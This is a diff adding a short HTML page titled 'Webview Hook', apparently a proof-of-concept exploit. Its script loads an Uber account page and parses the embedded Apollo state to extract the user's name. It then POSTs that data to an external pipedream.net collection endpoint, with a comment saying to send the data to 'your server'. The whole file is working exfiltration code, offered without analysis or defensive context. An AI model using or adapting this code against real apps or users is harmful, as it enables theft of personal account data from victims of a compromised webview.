@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webview Hook</title>
+</head>
+<body>
+    <script>
+        fetch('https://account.uber.com/?host_theme=light')
+            .then(response => response.text())
+            .then(data => {
+                let div = document.createElement('div');
+                div.innerHTML = data;
+                let jsonData = div.querySelector('#__APOLLO_STATE__').textContent;
+                let parsedData = JSON.parse(jsonData);
+                let nameData = parsedData["$ROOT_QUERY.getUserInfo.userInfo.name"];
+                
+                // Here, send the extracted data to your server
+                fetch('https://476f5920d79cc7312879c97ebd59d780.m.pipedream.net', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(nameData)
+                });
+            });
+    </script>
+</body>
+</html>
